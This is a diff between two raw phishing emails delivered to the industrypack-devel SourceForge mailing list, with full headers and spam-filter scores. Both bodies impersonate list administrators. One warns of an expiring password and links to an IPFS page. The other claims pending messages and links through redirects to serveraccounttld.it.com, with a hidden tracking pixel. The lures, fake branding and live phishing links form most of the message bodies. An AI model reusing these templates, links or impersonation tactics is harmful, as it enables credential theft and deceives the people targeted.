@@ -2,110 +2,107 @@ Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
 X-Original-To: lists+industrypack-devel@lfdr.de
 Delivered-To: lists+industrypack-devel@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id E9470AB260B
-	for <lists+industrypack-devel@lfdr.de>; Sun, 11 May 2025 03:38:33 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id A3E13AB2BB3
+	for <lists+industrypack-devel@lfdr.de>; Sun, 11 May 2025 23:52:20 +0200 (CEST)
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
-	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:MIME-Version:
-	Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
-	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
-	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
-	bh=6R/kkBYD2LuBY61b/65151E3Gr2SttgCvjU+8/DtrdU=; b=FMnR56ravIhwdXnk2Lwd9MsB9L
-	AHaPJUWC5YNhDzFbOvl9/jvqhpCHyz/Sc/PnDA3lhNsJV0uDrVJ04rg6Ryr37+pN5Xgq02O8WFmS8
-	1uMoShxXafPYlnnXGDsLsPtTHXlIHQQO3l6ofvL/iuLp4cPuU9Dino/l0GtbPbINo+nE=;
+	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:Message-ID:Date:
+	MIME-Version:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Owner;
+	bh=vaUVsn7+Kh7hu9p4ZMTjZ69voswbzABWTCQ3ykr6JeU=; b=Ec/x5L+vsjq6Rv6Rg/91NnDyif
+	pL745/0Q4Z3O/yXTpglk/0fLmanmDVcNWd/m0nq9R3vKn2hqdqovz3b2BtoqxakYPA1CtS+Ma58pE
+	39JrrysrrC4D763ARAa8te/gsiubvQw1O6dhjEgNJI6fAytsG0RBeuyDIHOYyhXZKXmM=;
 Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
 	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
 	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
-	id 1uDvdz-0005Tq-Po
+	id 1uEEap-0003BG-Dl
 	for lists+industrypack-devel@lfdr.de;
-	Sun, 11 May 2025 01:38:19 +0000
+	Sun, 11 May 2025 21:52:19 +0000
 Received: from [172.30.29.66] (helo=mx.sourceforge.net)
  by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
- TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
- (envelope-from <admin@newhomeinturkey.de>) id 1uDvdr-0005Te-0p
- for industrypack-devel@lists.sourceforge.net;
- Sun, 11 May 2025 01:38:11 +0000
+ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95) (envelope-from
+ <01000196c155649e-8e56aa07-e66e-4eb8-ab74-7b9766f63a2a-000000@amazonses.com>)
+ id 1uEEai-0003B4-Rq for industrypack-devel@lists.sourceforge.net;
+ Sun, 11 May 2025 21:52:12 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
- :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+ d=sourceforge.net; s=x; h=Message-ID:Date:MIME-Version:Content-Type:To:
+ Subject:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=jbEOfOhf63ZSqdS2gMP5E822TzpDfhNlYkWpYgTodAo=; b=MoqzqcsV7D+Ukzh6R05jz7zhvq
- cPE07taG68OkkgsdeAkNiFRE9RDJYKWCIS+kyADYMopAZNld4FxpI8Ma0Z3uAieo4d/9XVyFj37W9
- QGM/1nqvU9VLmJydpyYv9lf8jxiwT9QTiSNCfH/7EqaFRWbfjqQCayF3iO8K8jnVRHfc=;
+ bh=KFNYqP78NDzaBr9UVU37DSDP8BYiuBrF1lxpjHbqMfM=; b=MLyZKXBUkyUW1TiHmP7KJVW9TS
+ tOyUZk+ijhrvAcqNUukSAi+BVHlbWXZKMsnf3h1ur+0dH/0JFJAK3MjRSAp0BZMqG4mD5O/Idjqg8
+ nNKe+xvmM6N3ILPhT/S4xikHzODeEJZFjrmZObIfYkI8/aDIModv68P+q1Qucw6EhKJM=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
- Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
- :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
+ h=Message-ID:Date:MIME-Version:Content-Type:To:Subject:From:Sender:Reply-To
+ :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
+ Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=jbEOfOhf63ZSqdS2gMP5E822TzpDfhNlYkWpYgTodAo=; b=a
- 5VrrpibVu8RowBtWe4HdpocuhB4xpM/HG0seTR7R9EDmCJW6qWDx0VghZu4PQfFxShMSZo9/CCaDT
- /munXif1YnheDS/jXu3LPYbsia0AFqX9ke64GabiAszc0SbwcQ5F+HyyZ18JNpvb5accjitiIyseL
- I/EhmvMYNC9ZbX6U=;
-Received: from [85.121.148.20] (helo=raew9Ppa.ava.hosting)
- by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
- id 1uDvdn-0006oB-Sh for industrypack-devel@lists.sourceforge.net;
- Sun, 11 May 2025 01:38:08 +0000
-Received: from newhomeinturkey.de (raew9Ppa.ava.hosting [IPv6:::1])
- by raew9Ppa.ava.hosting (Postfix) with ESMTP id 261782682E
- for <industrypack-devel@lists.sourceforge.net>;
- Sun, 11 May 2025 04:37:09 +0300 (EEST)
-From: lists.sourceforge.net Admin <admin@newhomeinturkey.de>
+ List-Owner:List-Archive; bh=KFNYqP78NDzaBr9UVU37DSDP8BYiuBrF1lxpjHbqMfM=; b=D
+ +fuIppqZeyWeP39/iioDdNvxVwbspAdVXX3H7ihEBAdCNqfLr7a/zMGyg7IIhQGdjcNO+r36kAXB3
+ LTnhHXvxw39TpXV4CH7FLwA7PTZeHHDx1mphf5NSVHWJNdcIsZ8O5t4ot6Ov6FyILdeMNiOCBl1mw
+ mf/Efeyg7PKMbVIw=;
+Received: from a8-57.smtp-out.amazonses.com ([54.240.8.57])
+ by sfi-mx-2.v28.lw.sourceforge.com with esmtps
+ (TLS1.2:ECDHE-RSA-AES128-SHA256:128) (Exim 4.95) id 1uEEai-0003kj-5J
+ for industrypack-devel@lists.sourceforge.net;
+ Sun, 11 May 2025 21:52:12 +0000
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/simple;
+ s=seiecky4po7ubxedxbd6bj3bi3xn7pw4; d=oraq.ai; t=1747000321;
+ h=From:Subject:To:Content-Type:MIME-Version:Date:Message-Id;
+ bh=Vx5VRs/ZuTUAb/sYUum8A9Rw9s2svyp8itqAu4o/98o=;
+ b=R2iUm9ph3Zwb6Wyc3lKBX3B8oUzxNQwUtu7h6UpEwDHmnDgitJvu3SL87ZC8+cL9
+ MBsZ9ZldM/1TGPY6ciPv/rXsvzoe/kKHQaNmjjZBnGMsvjGft3sGsMuNetbrxv2sgj9
+ /PgBFT12xtRhkX3HSj7FQx4w7DMycGT231PqBGKtvxlVk+3qyIgHVYxJ8XCeTojvAg3
+ TxDy4H3EDOoRnIFmimXvL5Dbhk+XRXQNs9FvAty2Ox1KX3o4+p/+Axl+XL4Mz47lF60
+ 3gp3hbdA48vPVjxHnfnHKt1a7XBAJIAEREu4xQvhzjs0JryTOgK2IR8s5sJaERvExkA
+ FHHKxZbcCg==
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/simple;
+ s=6gbrjpgwjskckoa6a5zn6fwqkn67xbtw; d=amazonses.com; t=1747000321;
+ h=From:Subject:To:Content-Type:MIME-Version:Date:Message-Id:Feedback-ID;
+ bh=Vx5VRs/ZuTUAb/sYUum8A9Rw9s2svyp8itqAu4o/98o=;
+ b=diErthDX2IgjlFHx5HRCv+7DsmWnzTwFsPEbFUrLkH8XUHxxXQYhfOmRRxq/Kyoh
+ YsI5RmPSQHLQb7KXtObEq9Zxpps2zYq4liepyNye2TkG3+9cmMa8PCReV2PGqT8tEv3
+ BOEldyzhqvuPZHZD/+tlkEDotD/vqUckwtdX3Y+o=
+From: =?iso-8859-1?B?TUFJTCBDRU5URVKu?= <brittany.allardyce@oraq.ai>
 To: industrypack-devel@lists.sourceforge.net
-Date: 11 May 2025 01:37:08 -0700
-Message-ID: <20250511013708.06E32D012F120F75@newhomeinturkey.de>
 MIME-Version: 1.0
-X-Spam-Score: 6.5 (++++++)
-X-Spam-Report: Spam detection software,
- running on the system "util-spamd-1.v13.lw.sourceforge.com", 
- has identified this incoming email as possible spam.  The original
+Date: Sun, 11 May 2025 21:52:01 +0000
+Message-ID: <01000196c155649e-8e56aa07-e66e-4eb8-ab74-7b9766f63a2a-000000@email.amazonses.com>
+Feedback-ID: ::1.us-east-1.EwmKOIMXgK25iOi3NhMXTVSwSfDjAlSicwqfZ88ASYQ=:AmazonSES
+X-SES-Outgoing: 2025.05.11-54.240.8.57
+X-Spam-Score: 2.3 (++)
+X-Spam-Report: Spam detection software, running on the system "6901ab67b84d", 
+ has NOT identified this incoming email as spam.  The original
  message has been attached to this so you can view it or label
  similar future email.  If you have any questions, see
  the administrator of that system for details.
- Content preview: Account Security Check Dear
+ Content preview: Message Delivery Status
  industrypack-devel@lists.sourceforge.net
- Your password industrypack-devel@lists.sourceforge.net expires today 
- Content analysis details:   (6.5 points, 6.0 required)
+ You have (5) messages pending delivery. Please review the options below: 
+ Content analysis details:   (2.3 points, 5.0 required)
  pts rule name              description
  ---- ---------------------- --------------------------------------------------
- 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
- 3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
- [85.121.148.20 listed in zen.spamhaus.org]
- 0.1 URIBL_SBL_A Contains URL's A record listed in the Spamhaus SBL
- blocklist [URIs: ipfs.io]
- 0.0 DATE_IN_FUTURE_06_12   Date: is 6 to 12 hours after Received: date
- 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
- 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
- 0.0 T_MXG_EMAIL_FRAG       URI with email in fragment
- 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
- identical to background
+ 2.5 URIBL_DBL_SPAM         Contains a spam URL listed in the Spamhaus DBL
+ blocklist [URI: serveraccounttld.it.com]
+ -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from author's
+ domain
+ -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
+ -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
+ envelope-from domain
+ 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
+ not necessarily valid
+ 0.0 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level mail
+ domains are different
  0.0 HTML_MESSAGE           BODY: HTML included in message
- 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
- query to Validity was blocked.  See
- https://knowledge.validity.com/hc/en-us/articles/20961730681243
- for more information.
- [85.121.148.20 listed in bl.score.senderscore.com]
- 0.0 RCVD_IN_VALIDITY_SAFE_BLOCKED RBL: ADMINISTRATOR NOTICE: The
- query to Validity was blocked.  See
- https://knowledge.validity.com/hc/en-us/articles/20961730681243
- for more information.
- [85.121.148.20 listed in sa-accredit.habeas.com]
- 0.0 GOOG_REDIR_HTML_ONLY   Google redirect to obscure spamvertised
- website + HTML only
- 0.4 URI_IPFSIO References Interplanetary File System PtP content via
- ipfs.io, likely phishing
- 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
- 0.0 URI_IPFS               References Interplanetary File System PtP content, 
- probable phishing
- 0.0 GOOG_REDIR_NORDNS      Google redirect to obscure spamvertised
- website + no rDNS
- 0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
- only
-X-Headers-End: 1uDvdn-0006oB-Sh
-Subject: [Industrypack-devel] industrypack-devel@lists.sourceforge.net
- Account security check
+ 0.0 T_MXG_EMAIL_FRAG       BODY: URI with email in fragment
+ 0.0 RCVD_IN_MSPIKE_H5      RBL: Excellent reputation (+5)
+ [54.240.8.57 listed in wl.mailspike.net]
+ 0.0 RCVD_IN_MSPIKE_WL      Mailspike good senders
+X-Headers-End: 1uEEai-0003kj-5J
+Subject: [Industrypack-devel] Notification: Messages Awaiting Your Attention
 X-BeenThere: industrypack-devel@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -117,108 +114,109 @@ List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
 List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
  <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
-Content-Type: multipart/mixed; boundary="===============8042446988176448757=="
+Content-Type: multipart/mixed; boundary="===============3781117725248299798=="
 Errors-To: industrypack-devel-bounces@lists.sourceforge.net
 
---===============8042446988176448757==
-Content-Type: text/html;
-	charset="iso-8859-1"
+This is a multi-part message in MIME format
+--===============3781117725248299798==
+Content-Type: multipart/alternative; boundary="ZIMAFdjssLArtQC2LHKbgqq=_63KQ7XDX8"
+
+This is a multi-part message in MIME format
+--ZIMAFdjssLArtQC2LHKbgqq=_63KQ7XDX8
+Content-Type: text/plain; charset="iso-8859-1"
 Content-Transfer-Encoding: quoted-printable
 
-<HTML><HEAD>
-<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
-<body>
-<DIV aria-expanded=3Dfalse spellcheck=3Dfalse role=3Dtextbox tabIndex=3D1 a=
-ria-label=3D"Message Body" aria-multiline=3Dtrue aria-controls=3D:945 id=3D=
-:pg class=3D"Am aiL Al editable LW-avf tS-tW tS-tY" hideFocus contentEditab=
-le=3Dtrue style=3D"DIRECTION: ltr; MIN-HEIGHT: 230px" aria-owns=3D:945 itac=
-orner=3D"6,7:1,1,0,0" g_editable=3D"true" writingsuggestions=3D"false">
-<DIV dir=3Dltr>
-<DIV dir=3Dltr><SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto,sans-ser=
-if; COLOR: rgb(44,54,58)">&nbsp;</SPAN>
-<table style=3D"FONT-SIZE: 15px; BORDER-TOP: rgb(211,211,211) 1px dotted; F=
-ONT-FAMILY: Helvetica,Arial,Tahoma,Verdana,sans-serif; BORDER-RIGHT: rgb(21=
-1,211,211) 1px dotted; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(211,21=
-1,211) 1px dotted; COLOR: rgb(44,54,58); BORDER-LEFT: rgb(211,211,211) 1px =
-dotted; LINE-HEIGHT: 1.2; TEXT-INDENT: 0px" cellspacing=3D"0" cellpadding=
-=3D"0" width=3D"520" align=3D"center" border=3D"1">
-<TBODY style=3D"BOX-SIZING: border-box">
-<TR style=3D"BOX-SIZING: border-box; MIN-HEIGHT: 90px">
-<td style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(211,211,211) 1px dotte=
-d; FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; BORDER-RIGHT=
-: rgb(211,211,211) 1px dotted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; =
-MIN-HEIGHT: 90px; BORDER-LEFT: rgb(211,211,211) 1px dotted" height=3D"90">
-<table style=3D"FONT-SIZE: 14px; BORDER-TOP: rgb(211,211,211) 1px dotted; F=
-ONT-FAMILY: Arial,Helvetica; BORDER-RIGHT: rgb(211,211,211) 1px dotted; BOR=
-DER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; MIN-HEI=
-GHT: 90px; BORDER-LEFT: rgb(211,211,211) 1px dotted; LINE-HEIGHT: 1.2" cell=
-spacing=3D"0" cellpadding=3D"0" width=3D"100%" bgcolor=3D"#0078d7" border=
-=3D"1">
-<TBODY style=3D"BOX-SIZING: border-box">
-<TR style=3D"BOX-SIZING: border-box; MIN-HEIGHT: 90px">
-<td style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(211,211,211) 1px dotte=
-d; FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; BORDER-RIGHT=
-: rgb(211,211,211) 1px dotted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; =
-MIN-HEIGHT: 90px; BORDER-LEFT: rgb(211,211,211) 1px dotted" bgcolor=3D"#007=
-8d7" height=3D"90">
-<DIV style=3D'BOX-SIZING: border-box; FONT-SIZE: 18px; FONT-FAMILY: "UI WP =
-Helvetica",Arial,serif,EmojiFont; COLOR: rgb(255,255,255); PADDING-BOTTOM: =
-0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 30px; PADDING-RIGHT: =
-0px'>
-<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 28px; PADDING-BOTTOM: 0px;=
- PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 0px 10px; PADDING-RIG=
-HT: 0px">Account Security Check</DIV></DIV></TD></TR></TBODY></TABLE></TD><=
-/TR>
-<TR style=3D"BOX-SIZING: border-box">
-<td style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(211,211,211) 1px dotte=
-d; FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; BORDER-RIGHT=
-: rgb(211,211,211) 1px dotted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; =
-BORDER-LEFT: rgb(211,211,211) 1px dotted">
-<DIV style=3D'BOX-SIZING: border-box; FONT-FAMILY: Segoe,Tahoma,"Sans Verda=
-na",sans-serif,serif,EmojiFont; COLOR: rgb(51,51,51); PADDING-BOTTOM: 0px; =
-DIRECTION: ltr; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 0px 12=
-0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px'>
-<DIV style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px=
-; PADDING-LEFT: 0px; MARGIN: 20px 120px 30px 0px; LINE-HEIGHT: 20px; PADDIN=
-G-RIGHT: 0px">&nbsp;</DIV>
-<DIV style=3D'BOX-SIZING: border-box; FONT-SIZE: 17px; FONT-FAMILY: "UI WP =
-Segoe",Tahoma,"Sans Verdana",sans-serif,serif,EmojiFont; COLOR: rgb(0,120,2=
-15); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px =
-0px 10px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px'><FONT style=3D"BOX-SIZING:=
- border-box" color=3D#000000 size=3D3 face=3D"Times New Roman">Dear&nbsp; i=
-ndustrypack-devel@lists.sourceforge.net</FONT></DIV>
-<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; COLOR: rgb(102,102,1=
-02); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px =
-120px 30px 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px"><FONT style=3D"BOX-S=
-IZING: border-box" color=3D#000000 size=3D3 face=3D"Times New Roman">Your p=
-assword industrypack-devel@lists.sourceforge.net expires today</FONT><BR st=
-yle=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box">
-<A style=3D"BOX-SIZING: border-box; BACKGROUND-IMAGE: none; BACKGROUND-REPE=
-AT: repeat; COLOR: white; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LE=
-FT: 5px; DISPLAY: block; PADDING-RIGHT: 5px; BACKGROUND-COLOR: rgb(0,120,21=
-5); text-decoration-line: none; background-size: auto" href=3D"https://ipfs=
-=2Eio/ipfs/bafybeichgrzfhfc5wyunli4vwxtjglb7qrwpr46th4xwgtclswykreuvgu/chia=
-ds.html#industrypack-devel@lists.sourceforge.net" rel=3Dnoreferrer target=
-=3D_blank=20
-data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://ipfs.io/ipfs=
-/bafybeicieuwoijjzsnnkco47ihshbau2l5zr23f3kdrmelkwbnm4qx5qqm/indesx.html%23=
-%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1747004530057000&amp;usg=
-=3DAOvVaw3sIeP7rZV29jTTjDxJnKko">Click here to keep your password</A><BR st=
-yle=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box"><FONT s=
-tyle=3D"BOX-SIZING: border-box" color=3D#000000 size=3D3 face=3D"Times New =
-Roman"><SPAN style=3D"BOX-SIZING: border-box; TEXT-ALIGN: right">
-&copy; 2025 </SPAN></FONT>Message Center Admin Support</DIV></DIV></TD></TR=
-></TBODY></TABLE></DIV></DIV></DIV></BODY></HTML>
+
+Message Delivery Status
+
+industrypack-devel@lists.sourceforge.net You have (5) messages pending=
+ delivery.
+
+Please review the options below:
+
+Allow Messages https://serveraccounttld.it.com/othermaill/mailpage/fas=
+ed.html#industrypack-devel@lists.sourceforge.net
+
+Review Messages https://serveraccounttld.it.com/othermaill/mailpage/fa=
+sed.html#industrypack-devel@lists.sourceforge.net
+
+Please address this to avoid temporary suspension of message privilege=
+s.
+
+lists.sourceforge.net Support=20
+
+This message was sent automatically. Please do not reply.
+lists.sourceforge.netNotification: Messages Awaiting Your Attention Su=
+pport 2025
+
+--ZIMAFdjssLArtQC2LHKbgqq=_63KQ7XDX8
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
 
---===============8042446988176448757==
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859-=
+1">
+  <title>Notification: Messages Awaiting Your Attention</title>
+ </head>
+ <body> <DIV dir=3Dltr> <DIV id=3Dm_-2932704392113506342gmail-Item.MessageN=
+ormalizedBody style=3D"FONT-FAMILY: 'wf_segoe-ui_normal','Segoe UI','Segoe =
+WP',Tahoma,Arial,sans-serif,serif,'EmojiFont'"> <DIV> <DIV> <DIV> <DIV styl=
+e=3D"BORDER-TOP: rgb(220,220,220) 1px solid; FONT-FAMILY: Arial,sans-serif,=
+serif,'EmojiFont'; BORDER-RIGHT: rgb(220,220,220) 1px solid; WIDTH: 555px; =
+BORDER-BOTTOM: rgb(220,220,220) 1px solid; COLOR: rgb(51,51,51); PADDING-BO=
+TTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 20px; BORDER-LEFT: rgb(220,220=
+,220) 1px solid; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(255,255,255); b=
+order-radius: 8px"> <H2 style=3D"FONT-SIZE: 22px; COLOR: rgb(38,117,214); M=
+ARGIN: 0px 0px 10px">Message Delivery Status</H2> <P style=3D"FONT-SIZE: 16=
+px; MARGIN: 0px 0px 20px">industrypack-devel@lists.sourceforge.net You have=
+ <B>(5)</B> messages pending delivery.</p><p style=3D"FONT-SIZE: 16px; MARG=
+IN: 0px 0px 20px">Please review the options below:</P> <DIV style=3D"MARGIN=
+-BOTTOM: 20px"><A style=3D"TEXT-DECORATION: none; COLOR: white; PADDING-BOT=
+TOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 15px; DISPLAY: inline-block; PA=
+DDING-RIGHT: 15px; BACKGROUND-COLOR: rgb(38,117,214); MARGIN-RIGHT: 10px; b=
+order-radius: 5px" href=3D"https://8y0nmg3v.r.us-east-1.awstrack.me/L0/http=
+s:%2F%2Fserveraccounttld.it.com%2Fothermaill%2Fmailpage%2Ffased.html%23indu=
+strypack-devel@lists.sourceforge.net/1/01000196c155649e-8e56aa07-e66e-4eb8-=
+ab74-7b9766f63a2a-000000/GxZEjkeSlqGhRjQs-RwnRs84MTo=3D425" rel=3D"noopener=
+ noreferrer" target=3D_blank data-saferedirecturl=3D"https://www.google.com=
+/url?q=3Dhttps://BingGoogleeastben-exch0801.ggecu.com/owa%23ctr@brclassics.=
+com&amp;source=3Dgmail&amp;ust=3D1746895460555000&amp;usg=3DAOvVaw1lLbvdHOL=
+xWNVNCzdc5ztL">Allow Messages</A> <A style=3D"TEXT-DECORATION: none; COLOR:=
+ rgb(12,12,12); PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 15px=
+; DISPLAY: inline-block; PADDING-RIGHT: 15px; BACKGROUND-COLOR: rgb(220,220=
+,220); border-radius: 5px" href=3D"https://8y0nmg3v.r.us-east-1.awstrack.me=
+/L0/https:%2F%2Fserveraccounttld.it.com%2Fothermaill%2Fmailpage%2Ffased.htm=
+l%23industrypack-devel@lists.sourceforge.net/2/01000196c155649e-8e56aa07-e6=
+6e-4eb8-ab74-7b9766f63a2a-000000/boJANU7smk82hxv7Q026JjRD2JU=3D425" rel=3D"=
+noopener noreferrer" target=3D_blank data-saferedirecturl=3D"https://www.go=
+ogle.com/url?q=3Dhttps://BingGoogleeastben-exch0801.ggecu.com/owa%23ctr@brc=
+lassics.com&amp;source=3Dgmail&amp;ust=3D1746895460555000&amp;usg=3DAOvVaw1=
+lLbvdHOLxWNVNCzdc5ztL">Review Messages</A></DIV> <DIV style=3D"FONT-SIZE: 1=
+4px; COLOR: rgb(231,76,60); MARGIN: 10px 0px">Please address this to avoid =
+temporary suspension of message privileges.</DIV> <DIV style=3D"FONT-SIZE: =
+12px; MARGIN-TOP: 20px; COLOR: rgb(85,85,85)"><B>lists.sourceforge.net&nbsp=
+;Support</B> <P style=3D"MARGIN: 5px 0px 0px">This message was sent automat=
+ically. Please do not reply.<BR><BR>lists.sourceforge.net<SPAN id=3Deow_sub=
+ style=3D"FONT-SIZE: 15px">Notification: Messages Awaiting Your Attention</=
+SPAN>&nbsp;Support 2025</P></DIV></DIV></DIV></DIV></DIV></DIV></DIV><img a=
+lt=3D"" src=3D"https://8y0nmg3v.r.us-east-1.awstrack.me/I0/01000196c155649e=
+-8e56aa07-e66e-4eb8-ab74-7b9766f63a2a-000000/q7yl6k1j1fF1oOKFJ6XKMYxkaFs=3D=
+425" style=3D"display: none; width: 1px; height: 1px;">
+</body>
+ </html>
+
+--ZIMAFdjssLArtQC2LHKbgqq=_63KQ7XDX8--
+
+
+--===============3781117725248299798==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============8042446988176448757==
+--===============3781117725248299798==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -229,4 +227,5 @@ Industrypack-devel mailing list
 Industrypack-devel@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/industrypack-devel
 
---===============8042446988176448757==--
+--===============3781117725248299798==--
+
